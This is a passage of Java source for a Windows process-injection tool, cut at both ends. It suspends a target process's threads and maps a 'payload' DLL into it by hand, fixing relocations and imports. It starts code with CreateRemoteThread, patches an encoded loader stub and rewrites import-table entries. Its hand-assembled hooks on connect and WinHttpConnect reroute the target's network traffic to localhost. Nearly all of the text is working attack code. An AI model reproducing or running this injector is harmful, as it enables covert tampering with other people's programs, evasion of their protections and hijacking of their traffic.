            }
            if (!committed && !isNull(stepArea))
                Kernel32.INSTANCE.VirtualFreeEx(process, stepArea, 0, MEM_RELEASE);
            Kernel32.INSTANCE.CloseHandle(process);
        }
    }

    private static void validateTlsTemplate(byte[] image, Pe pe) throws IOException {
        int dir = pe.dataDirectoryOffset + 9 * 8;
        if (dir + 8 > image.length) throw new IOException("Truncated PE TLS directory entry");
        int tlsRva = le(image).getInt(dir);
        if (tlsRva == 0) {
            System.out.println("PE TLS: no static template");
            return;
        }
        if (tlsRva < 0 || tlsRva + 40 > image.length)
            throw new IOException("Invalid PE TLS directory RVA");
        ByteBuffer tls = le(image);
        long start = tls.getLong(tlsRva);
        long end = tls.getLong(tlsRva + 8);
        if (end < start) throw new IOException("Invalid PE TLS template bounds");
        long size = end - start;
        System.out.printf("PE TLS: rva=0x%x template=%d bytes%n", tlsRva, size);
        if (size > 8)
            throw new IOException("Payload has " + size + " bytes of static TLS, while the carrier supports 8. "
                + "The entry stub does not register additional TLS for manually mapped DLLs. "
                + "Rebuild the payload before injection.");
    }

    private static List<Pointer> suspendProcessThreads(int pid) throws IOException {
        Pointer snapshot = Kernel32.INSTANCE.CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        if (isInvalid(snapshot)) throw win32("CreateToolhelp32Snapshot(threads)");
        List<Pointer> suspended = new ArrayList<>();
        ThreadEntry entry = new ThreadEntry();
        try {
            entry.dwSize = entry.size();
            if (Kernel32.INSTANCE.Thread32First(snapshot, entry) == 0)
                throw win32("Thread32First");
            do {
                entry.read();
                if (entry.th32OwnerProcessID != pid) continue;
                Pointer h = Kernel32.INSTANCE.OpenThread(
                    THREAD_SUSPEND_RESUME | THREAD_QUERY_LIMITED_INFORMATION, 0,
                    entry.th32ThreadID);
                if (isNull(h)) continue;
                if (Kernel32.INSTANCE.SuspendThread(h) != -1) suspended.add(h);
                else Kernel32.INSTANCE.CloseHandle(h);
            } while (Kernel32.INSTANCE.Thread32Next(snapshot, entry) != 0);
        } finally {
            Kernel32.INSTANCE.CloseHandle(snapshot);
        }
        return suspended;
    }

    private static void resumeThreads(List<Pointer> threads) {
        for (Pointer h : threads) {
            try { Kernel32.INSTANCE.ResumeThread(h); }
            finally { Kernel32.INSTANCE.CloseHandle(h); }
        }
    }



    private static Mapping mapImageSection(Pointer process, Path file) throws IOException {
        Pointer fileHandle = Kernel32.INSTANCE.CreateFileW(new WString(file.toString()),
            GENERIC_READ | GENERIC_WRITE | GENERIC_EXECUTE,
            FILE_SHARE_READ | FILE_SHARE_DELETE, null,
            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, null);
        if (isInvalid(fileHandle)) throw win32("CreateFileW(carrier)");

        PointerByReference sectionRef = new PointerByReference();
        try {
            int status = Ntdll.INSTANCE.NtCreateSection(sectionRef, SECTION_ALL_ACCESS, null,
                null, PAGE_EXECUTE_READWRITE, SEC_IMAGE, fileHandle);
            if (status < 0)
                throw new IOException(String.format("NtCreateSection(SEC_IMAGE): 0x%08x", status));
        } finally {
            Kernel32.INSTANCE.CloseHandle(fileHandle);
        }

        Pointer section = sectionRef.getValue();
        PointerByReference base = new PointerByReference();
        LongByReference viewSize = new LongByReference(0);
        try {
            int status = Ntdll.INSTANCE.NtMapViewOfSection(section, process, base,
                0, 0, null, viewSize, VIEW_UNMAP, 0, PAGE_EXECUTE_READWRITE);
            if (status < 0)
                throw new IOException(String.format("NtMapViewOfSection: 0x%08x", status));
            return new Mapping(base.getValue(), viewSize.getValue(), true);
        } finally {
            Kernel32.INSTANCE.CloseHandle(section);
        }
    }



    private static void ensureRemoteLibrary(Pointer process, String library) throws IOException {




        if (isRemoteModuleLoaded(process, library)) {
            System.out.println("Remote library already loaded: " + library);
            return;
        }
        byte[] name = (library + '\0').getBytes(StandardCharsets.US_ASCII);
        Pointer remoteName = Kernel32.INSTANCE.VirtualAllocEx(process, null, name.length,
            MEM_COMMIT_RESERVE, PAGE_READWRITE);
        if (isNull(remoteName)) throw win32("VirtualAllocEx(" + library + ")");
        try {
            writeMemory(process, remoteName, name, "library name " + library);
            Pointer loadLibrary = function("kernel32.dll", "LoadLibraryA");
            Pointer thread = Kernel32.INSTANCE.CreateRemoteThread(
                process, null, 0, loadLibrary, remoteName, 0, null);
            if (isNull(thread)) throw win32("CreateRemoteThread(LoadLibraryA " + library + ")");
            try {
                int wait = Kernel32.INSTANCE.WaitForSingleObject(thread, 20_000);
                if (wait != WAIT_OBJECT_0)
                    throw new IOException("LoadLibraryA timed out: " + library);
                IntByReference exitCode = new IntByReference();
                if (Kernel32.INSTANCE.GetExitCodeThread(thread, exitCode) == 0 || exitCode.getValue() == 0)
                    throw new IOException("Remote LoadLibraryA failed: " + library);
            } finally {
                Kernel32.INSTANCE.CloseHandle(thread);
            }
        } finally {
            Kernel32.INSTANCE.VirtualFreeEx(process, remoteName, 0, MEM_RELEASE);
        }
    }

    private static boolean isRemoteModuleLoaded(Pointer process, String library) throws IOException {
        int pid = Kernel32.INSTANCE.GetProcessId(process);
        if (pid == 0) throw win32("GetProcessId");
        Pointer snapshot = Kernel32.INSTANCE.CreateToolhelp32Snapshot(
            TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid);
        if (isInvalid(snapshot)) throw win32("CreateToolhelp32Snapshot(libraries)");
        try {
            ModuleEntry entry = new ModuleEntry();
            entry.dwSize = entry.size();
            if (Kernel32.INSTANCE.Module32FirstW(snapshot, entry) == 0)
                throw win32("Module32FirstW(libraries)");
            do {
                entry.read();
                if (library.equalsIgnoreCase(Native.toString(entry.szModule))) return true;
                entry.dwSize = entry.size();
            } while (Kernel32.INSTANCE.Module32NextW(snapshot, entry) != 0);
            return false;
        } finally {
            Kernel32.INSTANCE.CloseHandle(snapshot);
        }
    }



    private static void redirectProcessTerminationToCurrentThread(byte[] image, Pe pe)
            throws IOException {
        ByteBuffer buffer = le(image);
        Pointer exitThread  = function("kernel32.dll", "ExitThread");
        Pointer exitProcess = function("kernel32.dll", "ExitProcess");
        Pointer termProcess = function("kernel32.dll", "TerminateProcess");
        long exitThreadAddr  = Pointer.nativeValue(exitThread);
        long exitProcessAddr = Pointer.nativeValue(exitProcess);
        long termProcessAddr = Pointer.nativeValue(termProcess);
        if (pe.importRva == 0) return;
        int descriptor = pe.importRva;
        int patched = 0;
        while (descriptor != 0 && descriptor + 20 <= image.length) {
            int firstThunk = buffer.getInt(descriptor + 16);
            if (firstThunk == 0) break;
            for (int idx = 0; firstThunk + idx * 8 + 8 <= image.length; idx++) {
                int off = firstThunk + idx * 8;
                long addr = buffer.getLong(off);
                if (addr == 0) break;
                if (addr == exitProcessAddr || addr == termProcessAddr) {
                    buffer.putLong(off, exitThreadAddr);
                    patched++;
                }
            }
            descriptor += 20;
        }
        System.out.printf("Process-termination guard: %d IAT slot%s patched (ExitProcess/TerminateProcess -> ExitThread)%n",
            patched, patched == 1 ? "" : "s");
    }



    private static byte[] buildLoaderStub() {
        byte[] original = java.util.Base64.getDecoder().decode(LOADER_STUB_BASE64);


        int returnAt = original.length - 7;
        if (original[returnAt] != 0x33 || original[returnAt + 1] != (byte)0xC0)
            throw new IllegalStateException("Unsupported loader return layout");
        original[returnAt] = (byte)0x90;
        original[returnAt + 1] = (byte)0x90;
        int insertAt = 0xD7;
        if (original.length <= insertAt || original[insertAt] != 0x48)
            throw new IllegalStateException("Unsupported loader stub layout at 0x" +
                Integer.toHexString(insertAt));
        byte[] callback = {
            0x48, (byte)0x8B, 0x44, 0x24, 0x20,
            0x48, (byte)0x83, 0x78, 0x38, 0x00,
            0x74, 0x0D,
            0x48, (byte)0x8B, 0x44, 0x24, 0x20,
            0x48, (byte)0x8B, 0x48, 0x40,
            (byte)0xFF, 0x50, 0x38,
            (byte)0x90
        };
        byte[] extended = new byte[original.length + callback.length];
        System.arraycopy(original, 0, extended, 0, insertAt);
        System.arraycopy(callback, 0, extended, insertAt, callback.length);
        System.arraycopy(original, insertAt, extended, insertAt + callback.length,
            original.length - insertAt);
        return extended;
    }



    private static byte[] buildConnectThunk(long originalConnect, int port) {


        ByteBuffer code = ByteBuffer.allocate(96).order(ByteOrder.LITTLE_ENDIAN);

        put(code, 0x41, 0x83, 0xF8, 0x10);
        int shortLengthJump = putShortJump(code, 0x72);

        put(code, 0x66, 0x83, 0x3A, 0x02);
        int familyJump = putShortJump(code, 0x75);

        put(code, 0x66, 0x81, 0x7A, 0x02, 0x1F, (byte)0x90);
        int portJump = putShortJump(code, 0x75);

        put(code, 0x81, 0x7A, 0x04, 0x59, 0x7E, (byte)0xF8, 0x51);
        int addressJump = putShortJump(code, 0x75);

        put(code, 0xC7, 0x42, 0x04, 0x7F, 0x00, 0x00, 0x01);

        int portBE = ((port & 0xFF) << 8) | ((port >> 8) & 0xFF);
        put(code, 0x66, 0xC7, 0x42, 0x02, (byte)(portBE >> 8), (byte)(portBE & 0xFF));
        int pass = code.position();
        patchShortJump(code, shortLengthJump, pass);
        patchShortJump(code, familyJump, pass);
        patchShortJump(code, portJump, pass);
        patchShortJump(code, addressJump, pass);
        put(code, 0x48, (byte)0xB8); code.putLong(originalConnect);
        put(code, (byte)0xFF, (byte)0xE0);
        return java.util.Arrays.copyOf(code.array(), code.position());
    }





    private static byte[] buildWinHttpConnectThunk(long originalWinHttpConnect, int port) {







        ByteBuffer code = ByteBuffer.allocate(128).order(ByteOrder.LITTLE_ENDIAN);

        put(code, 0x41, 0x81, (byte)0xF8, (byte)0xBB, 0x01, 0x00, 0x00);
        int jnePort443 = putShortJump(code, 0x75);

        int startRedirect = code.position();


        put(code, 0x41, 0x81, (byte)0xF8, 0x50, 0x00, 0x00, 0x00);
        int jnePort80 = putShortJump(code, 0x75);
        patchShortJump(code, jnePort443, code.position() - startRedirect + (startRedirect - (jnePort443 + 1)));







        put(code, 0x48, (byte)0xBA);
        int rdxPatch = code.position();
        code.putLong(0xCCCCCCCCCCCCCCCCL);

        put(code, 0x41, (byte)0xB8); code.putInt(port);

        put(code, 0x48, (byte)0xB8); code.putLong(originalWinHttpConnect);
        put(code, (byte)0xFF, (byte)0xE0);
        int passTarget = code.position();
        patchShortJump(code, jnePort80, passTarget);

        put(code, 0x48, (byte)0xB8); code.putLong(originalWinHttpConnect);
        put(code, (byte)0xFF, (byte)0xE0);

        int wstrOffset = code.position();
        String whost = "127.0.0.1";
        for (char c : whost.toCharArray()) {
            code.putShort((short)c);
        }
        code.putShort((short)0);




        byte[] result = java.util.Arrays.copyOf(code.array(), code.position());

        byte[] out = new byte[result.length + 8];
        System.arraycopy(result, 0, out, 0, result.length);
        ByteBuffer meta = ByteBuffer.wrap(out, result.length, 8).order(ByteOrder.LITTLE_ENDIAN);
        meta.putInt(rdxPatch);
        meta.putInt(wstrOffset);
        return out;
    }


    private static void patchWinHttpThunk(Pointer process, Pointer thunkBase,
                                           byte[] thunkBytes) throws IOException {
        if (thunkBytes.length < 8) return;
        ByteBuffer meta = ByteBuffer.wrap(thunkBytes, thunkBytes.length - 8, 8)
            .order(ByteOrder.LITTLE_ENDIAN);
        int rdxPatch   = meta.getInt();
        int wstrOffset = meta.getInt();
        long remoteBase = Pointer.nativeValue(thunkBase);
        long wstrAddr = remoteBase + wstrOffset;
        ByteBuffer patch = ByteBuffer.allocate(8).order(ByteOrder.LITTLE_ENDIAN);
        patch.putLong(wstrAddr);
        writeMemory(process, new Pointer(remoteBase + rdxPatch), patch.array(), "WinHTTP thunk rdx patch");
        System.out.printf("WinHTTP thunk patched: wstrAddr=0x%x%n", wstrAddr);
    }


    private static void redirectWinHttpConnections(Pointer process, int pid,
                                                    Pointer thunk,
                                                    long originalWinHttpConnect) throws IOException {



        byte[] wanted = ByteBuffer.allocate(8).order(ByteOrder.LITTLE_ENDIAN)
            .putLong(originalWinHttpConnect).array();
        byte[] replacement = ByteBuffer.allocate(8).order(ByteOrder.LITTLE_ENDIAN)
            .putLong(Pointer.nativeValue(thunk)).array();
        int totalPatched = 0;


        Pointer snapshot = Kernel32.INSTANCE.CreateToolhelp32Snapshot(
            TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid);
        if (isInvalid(snapshot)) throw win32("CreateToolhelp32Snapshot(winhttp modules)");
        try {
            ModuleEntry entry = new ModuleEntry();
            entry.dwSize = entry.size();
            if (Kernel32.INSTANCE.Module32FirstW(snapshot, entry) == 0)
                throw win32("Module32FirstW(winhttp)");
            do {
                entry.read();

                try {
                    byte[] modImage = readMemory(process, entry.modBaseAddr,
                        Math.min(entry.modBaseSize, 0x10_0000), "module scan");
                    for (int offset = 0; offset <= modImage.length - 8; offset++) {
                        boolean eq = true;
                        for (int i = 0; i < 8; i++) {
                            if (modImage[offset + i] != wanted[i]) { eq = false; break; }
                        }
                        if (eq) {
                            Pointer slot = new Pointer(Pointer.nativeValue(entry.modBaseAddr) + offset);
                            IntByReference oldProt = new IntByReference();
                            if (Kernel32.INSTANCE.VirtualProtectEx(process, slot, 8, PAGE_READWRITE, oldProt) == 0)
                                continue;
                            writeMemory(process, slot, replacement, "WinHTTP IAT slot");
                            IntByReference ignored = new IntByReference();
                            Kernel32.INSTANCE.VirtualProtectEx(process, slot, 8, oldProt.getValue(), ignored);
                            totalPatched++;
                        }
                    }
                } catch (IOException ignored) {}
                entry.dwSize = entry.size();
            } while (Kernel32.INSTANCE.Module32NextW(snapshot, entry) != 0);
        } finally {
            Kernel32.INSTANCE.CloseHandle(snapshot);
        }
        System.out.printf("WinHTTP redirect: %d IAT slot%s patched%n",
            totalPatched, totalPatched == 1 ? "" : "s");
    }

    private static int putShortJump(ByteBuffer code, int opcode) {
        put(code, opcode, 0);
        return code.position() - 1;
    }

    private static void patchShortJump(ByteBuffer code, int dispOff, int target) {
        int disp = target - (dispOff + 1);
        if (disp < Byte.MIN_VALUE || disp > Byte.MAX_VALUE)
            throw new IllegalStateException("Jump out of range at 0x" + Integer.toHexString(dispOff));
        code.put(dispOff, (byte) disp);
    }



    private static void redirectAssetConnections(Pointer process, int pid, Pointer thunk,
                                                  long originalConnect) throws IOException {
        RemoteModule net = findRemoteModule(pid, "net.dll");
        byte[] image = readMemory(process, net.base, net.size, "net.dll image");
        byte[] wanted = ByteBuffer.allocate(8).order(ByteOrder.LITTLE_ENDIAN)
            .putLong(originalConnect).array();
        List<Integer> matches = new ArrayList<>();
        for (int offset = 0; offset <= image.length - wanted.length; offset++) {
            boolean eq = true;
            for (int i = 0; i < wanted.length; i++)
                if (image[offset + i] != wanted[i]) { eq = false; break; }
            if (eq) matches.add(offset);
        }
        if (matches.isEmpty()) throw new IOException("Cannot locate net.dll connect import");
        byte[] replacement = ByteBuffer.allocate(8).order(ByteOrder.LITTLE_ENDIAN)
            .putLong(Pointer.nativeValue(thunk)).array();
        for (int offset : matches) {
            Pointer slot = new Pointer(Pointer.nativeValue(net.base) + offset);
            IntByReference oldProt = new IntByReference();
            if (Kernel32.INSTANCE.VirtualProtectEx(process, slot, 8, PAGE_READWRITE, oldProt) == 0)
                throw win32("VirtualProtectEx(net.dll connect IAT)");
            writeMemory(process, slot, replacement, "net.dll connect IAT");
            IntByReference ignored = new IntByReference();
            Kernel32.INSTANCE.VirtualProtectEx(process, slot, 8, oldProt.getValue(), ignored);
        }
        System.out.printf("Offline asset redirect installed in net.dll (%d slot%s)%n",
            matches.size(), matches.size() == 1 ? "" : "s");
    }



    private static RemoteModule findRemoteModule(int pid, String wantedName) throws IOException {
        Pointer snapshot = Kernel32.INSTANCE.CreateToolhelp32Snapshot(
            TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid);
        if (isInvalid(snapshot)) throw win32("CreateToolhelp32Snapshot(modules)");
        try {
            ModuleEntry entry = new ModuleEntry();
            entry.dwSize = entry.size();
            if (Kernel32.INSTANCE.Module32FirstW(snapshot, entry) == 0)
                throw win32("Module32FirstW");
            do {
                entry.read();
                if (wantedName.equalsIgnoreCase(Native.toString(entry.szModule)))
                    return new RemoteModule(entry.modBaseAddr, entry.modBaseSize);
                entry.dwSize = entry.size();
            } while (Kernel32.INSTANCE.Module32NextW(snapshot, entry) != 0);
        } finally {
            Kernel32.INSTANCE.CloseHandle(snapshot);
        }
        throw new IOException("Target module not loaded: " + wantedName);
    }



    private static byte[] mapRawToVirtual(byte[] raw, Pe pe) {
        byte[] image = new byte[pe.imageSize];
        System.arraycopy(raw, 0, image, 0, Math.min(pe.headersSize, raw.length));
        for (Section s : pe.sections) {
            if (s.rawSize <= 0 || s.rawPointer < 0 || s.rawPointer >= raw.length) continue;
            int available = Math.min(s.rawSize, raw.length - s.rawPointer);
            int destAvail = Math.max(0, image.length - s.virtualAddress);
            int count = Math.min(available, destAvail);
            if (count > 0) System.arraycopy(raw, s.rawPointer, image, s.virtualAddress, count);
        }
        return image;
    }

    private static void applyRelocations(byte[] image, long oldBase, long newBase, Pe pe) {
        long delta = newBase - oldBase;
        if (delta == 0 || pe.relocationRva == 0 || pe.relocationSize == 0) return;
        ByteBuffer buf = le(image);
        int offset = pe.relocationRva;
        int end = Math.min(image.length, safeAdd(pe.relocationRva, pe.relocationSize));
        while (offset + 8 <= end) {
            int pageRva   = buf.getInt(offset);
            int blockSize = buf.getInt(offset + 4);
            if (blockSize < 8 || offset + blockSize > end) break;
            for (int i = 0; i < (blockSize - 8) / 2; i++) {
                int item = Short.toUnsignedInt(buf.getShort(offset + 8 + i * 2));
                int type = item >>> 12;
                int rva  = pageRva + (item & 0xfff);
                if (type == 10 && rva >= 0 && rva + 8 <= image.length)
                    buf.putLong(rva, buf.getLong(rva) + delta);
                else if (type == 3 && rva >= 0 && rva + 4 <= image.length)
                    buf.putInt(rva, (int)(buf.getInt(rva) + delta));

            }
            offset += blockSize;
        }
    }

    private static void setImageBase(byte[] image, Pe pe, long imageBase) {
        le(image).putLong(pe.optionalHeaderOffset + 24, imageBase);
    }

    private static int findExport(byte[] image, Pe pe, String wantedName) {
        ByteBuffer buf = le(image);
        int exportRva = pe.exportRva;
        if (exportRva <= 0 || exportRva + 40 > image.length) return 0;
        int numFuncs  = buf.getInt(exportRva + 20);
        int numNames  = buf.getInt(exportRva + 24);
        int functions = buf.getInt(exportRva + 28);
        int names     = buf.getInt(exportRva + 32);
        int ordinals  = buf.getInt(exportRva + 36);
        for (int i = 0; i < numNames; i++) {
            int nameRva = buf.getInt(names + i * 4);
            if (wantedName.equals(cString(image, nameRva))) {
                int ord = Short.toUnsignedInt(buf.getShort(ordinals + i * 2));
                return ord < numFuncs ? buf.getInt(functions + ord * 4) : 0;
            }
        }
        return 0;
    }

    private static Set<String> importLibraries(byte[] image, Pe pe) {
        Set<String> libs = new LinkedHashSet<>();
        ByteBuffer buf = le(image);
        int desc = pe.importRva;
        while (desc != 0 && desc + 20 <= image.length) {
            int nameRva    = buf.getInt(desc + 12);
            int firstThunk = buf.getInt(desc + 16);
            if (nameRva == 0 || firstThunk == 0) break;
            libs.add(cString(image, nameRva));
            desc += 20;
        }
        return libs;
    }

    private static void resolveImports(byte[] image, Pe pe) throws IOException {
        ByteBuffer buf = le(image);
        int desc = pe.importRva;
        while (desc != 0 && desc + 20 <= image.length) {
            int origFirst  = buf.getInt(desc);
            int nameRva    = buf.getInt(desc + 12);
            int firstThunk = buf.getInt(desc + 16);
            if (nameRva == 0 || firstThunk == 0) break;
            String library = cString(image, nameRva);
            Pointer module = Kernel32.INSTANCE.LoadLibraryA(library);
            if (isNull(module)) throw win32("LoadLibraryA(" + library + ")");
            int names = origFirst != 0 ? origFirst : firstThunk;
            for (int i = 0; ; i++) {
                int srcOff = names      + i * 8;
                int dstOff = firstThunk + i * 8;
                if (srcOff + 8 > image.length || dstOff + 8 > image.length) break;
                long thunk = buf.getLong(srcOff);
                if (thunk == 0) break;
                Pointer addr;
                if ((thunk & Long.MIN_VALUE) != 0) {
                    addr = Kernel32.INSTANCE.GetProcAddress(module, new Pointer(thunk & 0xffff));
                } else {
                    int hintRva = (int)(thunk & 0xFFFFFFFFL);
                    if (hintRva + 2 >= image.length) break;
                    String fn = cString(image, hintRva + 2);
                    try (Memory m = ascii(fn)) {
                        addr = Kernel32.INSTANCE.GetProcAddress(module, m);
                    }
                }
                if (isNull(addr)) throw new IOException("Cannot resolve import in " + library);
                buf.putLong(dstOff, Pointer.nativeValue(addr));
            }
            desc += 20;
        }
    }

    private static void protectSections(Pointer process, Pointer base, Pe pe) throws IOException {
        IntByReference old = new IntByReference();
        if (Kernel32.INSTANCE.VirtualProtectEx(process, base, pe.headersSize, PAGE_READONLY, old) == 0)
            throw win32("VirtualProtectEx(headers)");
        long baseAddr = Pointer.nativeValue(base);
        for (Section s : pe.sections) {
            long size = Math.max(Integer.toUnsignedLong(s.virtualSize),
                                  Integer.toUnsignedLong(s.rawSize));
            if (size == 0) continue;
            int prot = sectionProtection(s.characteristics);
            Pointer secAddr = new Pointer(baseAddr + Integer.toUnsignedLong(s.virtualAddress));
            if (Kernel32.INSTANCE.VirtualProtectEx(process, secAddr, size, prot, old) == 0)
                throw win32("VirtualProtectEx(section " + s.name + ")");
        }
    }

    private static int sectionProtection(int ch) {
        boolean x = (ch & 0x2000_0000) != 0;
        boolean r = (ch & 0x4000_0000) != 0;
        boolean w = (ch & 0x8000_0000) != 0;
        if (x) return w ? PAGE_EXECUTE_READWRITE : (r ? PAGE_EXECUTE_READ : PAGE_EXECUTE);
        return w ? PAGE_READWRITE : (r ? PAGE_READONLY : PAGE_NOACCESS);
    }

    private static Pe parsePe(byte[] bytes) {
        if (bytes.length < 0x100) throw new IllegalArgumentException("PE is too small");
        ByteBuffer buf = le(bytes);
        if (Short.toUnsignedInt(buf.getShort(0)) != 0x5a4d)
            throw new IllegalArgumentException("Bad DOS signature");
        int peOff = buf.getInt(0x3c);
        if (peOff < 0 || peOff + 0x108 > bytes.length || buf.getInt(peOff) != 0x4550)
            throw new IllegalArgumentException("Bad NT signature");
        int fileHdr = peOff + 4;
        int optHdr  = fileHdr + 20;
        int magic   = Short.toUnsignedInt(buf.getShort(optHdr));
        if (magic != 0x20b) throw new IllegalArgumentException("Only PE64 is supported");
        Pe pe = new Pe();
        pe.x64 = true;
        pe.optionalHeaderOffset  = optHdr;
        pe.entryRva    = buf.getInt(optHdr + 16);
        pe.imageBase   = buf.getLong(optHdr + 24);
        pe.imageSize   = buf.getInt(optHdr + 56);
        pe.headersSize = buf.getInt(optHdr + 60);
        pe.dataDirectoryOffset   = optHdr + 112;
        pe.exportRva    = buf.getInt(pe.dataDirectoryOffset);
        pe.importRva    = buf.getInt(pe.dataDirectoryOffset + 8);
        pe.exceptionRva = buf.getInt(pe.dataDirectoryOffset + 3 * 8);
        pe.exceptionSize= buf.getInt(pe.dataDirectoryOffset + 3 * 8 + 4);
        pe.relocationRva = buf.getInt(pe.dataDirectoryOffset + 5 * 8);
        pe.relocationSize= buf.getInt(pe.dataDirectoryOffset + 5 * 8 + 4);
        int secCount = Short.toUnsignedInt(buf.getShort(fileHdr + 2));
        int optSize  = Short.toUnsignedInt(buf.getShort(fileHdr + 16));
        int secTable = optHdr + optSize;
        for (int i = 0; i < secCount; i++) {
            int off = secTable + i * 40;
            Section s = new Section();
            s.name = readSectionName(bytes, off);
            s.virtualSize    = buf.getInt(off + 8);
            s.virtualAddress = buf.getInt(off + 12);
            s.rawSize        = buf.getInt(off + 16);
            s.rawPointer     = buf.getInt(off + 20);
            s.characteristics= buf.getInt(off + 36);
            pe.sections.add(s);
        }
        return pe;
    }

    private static String readSectionName(byte[] bytes, int off) {
        int len = 0;
        while (len < 8 && bytes[off + len] != 0) len++;
        return new String(bytes, off, len, StandardCharsets.US_ASCII);
    }

    private static String cString(byte[] bytes, int off) {
        if (off < 0 || off >= bytes.length)
            throw new IllegalArgumentException("String RVA outside image: 0x" + Integer.toHexString(off));
        int end = off;
        while (end < bytes.length && bytes[end] != 0) end++;
        return new String(bytes, off, end - off, StandardCharsets.US_ASCII);
    }

    private static int safeAdd(int a, int b) {
        long v = Integer.toUnsignedLong(a) + Integer.toUnsignedLong(b);
        if (v > 0xFFFFFFFFL) throw new IllegalArgumentException("PE range overflow");
        return (int) v;
    }

    private static ByteBuffer le(byte[] bytes) {
        return ByteBuffer.wrap(bytes).order(ByteOrder.LITTLE_ENDIAN);
    }

    private static Memory ascii(String value) {
        byte[] bytes = (value + '\0').getBytes(StandardCharsets.US_ASCII);
        Memory mem = new Memory(bytes.length);
        mem.write(0, bytes, 0, bytes.length);
        return mem;
    }

    private static String sha256(byte[] bytes) throws Exception {
        byte[] digest = MessageDigest.getInstance("SHA-256").digest(bytes);
        StringBuilder sb = new StringBuilder(digest.length * 2);
        for (byte b : digest) sb.append(String.format("%02x", b));
        return sb.toString();
    }

    private static void writeMemory(Pointer process, Pointer dst, byte[] bytes, String label)
            throws IOException {
        try (Memory src = new Memory(bytes.length)) {
            src.write(0, bytes, 0, bytes.length);
            if (Kernel32.INSTANCE.WriteProcessMemory(process, dst, src, bytes.length, null) == 0)
                throw win32("WriteProcessMemory(" + label + ")");
        }
    }

    private static int readInt(Pointer process, Pointer addr) throws IOException {
        try (Memory out = new Memory(4)) {
            if (Kernel32.INSTANCE.ReadProcessMemory(process, addr, out, 4, null) == 0)
                throw win32("ReadProcessMemory(step)");
            return out.getInt(0);
        }
    }

    private static byte[] readMemory(Pointer process, Pointer addr, int size, String label)
            throws IOException {
        try (Memory out = new Memory(size)) {
            if (Kernel32.INSTANCE.ReadProcessMemory(process, addr, out, size, null) == 0)
                throw win32("ReadProcessMemory(" + label + ")");
            return out.getByteArray(0, size);
        }
    }

    private static Pointer function(String library, String name) throws IOException {
        Pointer module = Kernel32.INSTANCE.LoadLibraryA(library);
        if (isNull(module)) throw win32("LoadLibraryA(" + library + ")");
        try (Memory text = ascii(name)) {
            Pointer addr = Kernel32.INSTANCE.GetProcAddress(module, text);
            if (isNull(addr)) throw win32("GetProcAddress(" + library + "!" + name + ")");
            return addr;
        }
    }

    private static IOException win32(String op) {
        return new IOException(op + " failed: " + Kernel32.INSTANCE.GetLastError());
    }

    private static boolean isNull(Pointer p)    { return p == null || Pointer.nativeValue(p) == 0; }
    private static boolean isInvalid(Pointer p) { return isNull(p) || Pointer.nativeValue(p) == -1L; }

    private static void put(ByteBuffer out, int... bytes) {
        for (int v : bytes) out.put((byte) v);
    }



    private record Mapping(Pointer base, long size, boolean sectionBacked) {}
    private record RemoteModule(Pointer base, int size) {}

    public static final class ModuleEntry extends Structure {
        public int dwSize, th32ModuleID, th32ProcessID, GlblcntUsage, ProccntUsage;
        public Pointer modBaseAddr;
        public int modBaseSize;
        public Pointer hModule;
        public char[] szModule  = new char[256];
        public char[] szExePath = new char[260];
        @Override
        protected List<String> getFieldOrder() {
            return List.of("dwSize","th32ModuleID","th32ProcessID","GlblcntUsage",
                "ProccntUsage","modBaseAddr","modBaseSize","hModule","szModule","szExePath");
        }
    }

    public static final class ThreadEntry extends Structure {
        public int dwSize, cntUsage, th32ThreadID, th32OwnerProcessID;
        public int tpBasePri, tpDeltaPri, dwFlags;
        @Override
        protected List<String> getFieldOrder() {
            return List.of("dwSize", "cntUsage", "th32ThreadID", "th32OwnerProcessID",
                "tpBasePri", "tpDeltaPri", "dwFlags");
        }
    }

    private static final class Pe {
        boolean x64;
        long imageBase;
        int entryRva, imageSize, headersSize;
        int optionalHeaderOffset, dataDirectoryOffset;
        int exportRva, importRva;
        int exceptionRva, exceptionSize;
        int relocationRva, relocationSize;
        final List<Section> sections = new ArrayList<>();
    }

    private static final class Section {
        String name;
        int virtualSize, virtualAddress, rawSize, rawPointer, characteristics;
    }



    private interface Kernel32 extends StdCallLibrary {
        Kernel32 INSTANCE = Native.load("kernel32", Kernel32.class);
        Pointer OpenProcess(int access, int inheritHandle, int processId);
        int GetProcessId(Pointer process);
        Pointer CreateToolhelp32Snapshot(int flags, int processId);
        int Thread32First(Pointer snapshot, ThreadEntry entry);
        int Thread32Next(Pointer snapshot, ThreadEntry entry);
        Pointer OpenThread(int access, int inheritHandle, int threadId);
        int SuspendThread(Pointer thread);
        int ResumeThread(Pointer thread);
        int Module32FirstW(Pointer snapshot, ModuleEntry entry);
        int Module32NextW(Pointer snapshot, ModuleEntry entry);
        Pointer CreateFileW(WString fileName, int access, int shareMode,
                            Pointer securityAttributes, int creationDisposition,
                            int flags, Pointer templateFile);
        Pointer VirtualAllocEx(Pointer process, Pointer address, long size,
                               int allocationType, int protection);
        int VirtualFreeEx(Pointer process, Pointer address, long size, int freeType);
        int VirtualProtectEx(Pointer process, Pointer address, long size,
                             int protection, IntByReference oldProtection);
        int WriteProcessMemory(Pointer process, Pointer destination, Pointer source,
                               long size, Pointer bytesWritten);
        int ReadProcessMemory(Pointer process, Pointer source, Pointer destination,
                              long size, Pointer bytesRead);
        Pointer CreateRemoteThread(Pointer process, Pointer attributes, long stackSize,
                                   Pointer startAddress, Pointer parameter,
                                   int creationFlags, Pointer threadId);
        int WaitForSingleObject(Pointer handle, int milliseconds);
        int GetExitCodeThread(Pointer thread, IntByReference exitCode);
        int FlushInstructionCache(Pointer process, Pointer address, long size);
        Pointer LoadLibraryA(String name);
        Pointer GetProcAddress(Pointer module, Pointer name);
        int CloseHandle(Pointer handle);
        int GetLastError();
    }

    private interface Ntdll extends StdCallLibrary {
        Ntdll INSTANCE = Native.load("ntdll", Ntdll.class);
        int NtCreateSection(PointerByReference sectionHandle, int desiredAccess,
                            Pointer objectAttributes, LongByReference maximumSize,
                            int sectionPageProtection, int allocationAttributes,
                            Pointer fileHandle);
        int NtMapViewOfSection(Pointer sectionHandle, Pointer processHandle,
                               PointerByReference baseAddress, long zeroBits, long commitSize,
                               LongByReference sectionOffset, LongByReference viewSize,
                               int inheritDisposition, int allocationType, int win32Protect);
        int NtUnmapViewOfSection(Pointer processHandle, Pointer baseAddress);
